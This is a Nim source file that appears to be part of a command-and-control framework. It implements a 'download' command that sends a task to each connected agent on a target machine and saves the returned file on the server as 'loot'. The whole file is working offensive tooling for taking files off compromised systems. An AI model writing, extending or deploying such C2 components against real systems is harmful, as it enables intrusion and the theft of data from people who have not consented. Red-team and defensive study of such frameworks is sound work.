import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 1:
    errorLog "you must specify a path, see 'help download'"
    return

  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("download", @[ args[0] ])
    if not task.isNil(): 
      await task.awaitResponse()
      if not task.isError():
        let p = initParser()
        p.setBuffer(cast[seq[byte]](task.output.data))

        client.saveLoot(
          LootFile, splitPath(args[0]).tail, p.extractString() 
        )
      else:
        errorLog "error from agent: " & task.output.error

let cmd*: Command = Command(
  execProc: execProc,
  name: "download",
  argsLength: 1,
  usage: @["download \"[path]\""],
  cliMode: @[ClientInteractMode],
  description: "Download a file from the target",
  category: CCClientInteraction,
  requiresConnectedClient: true
)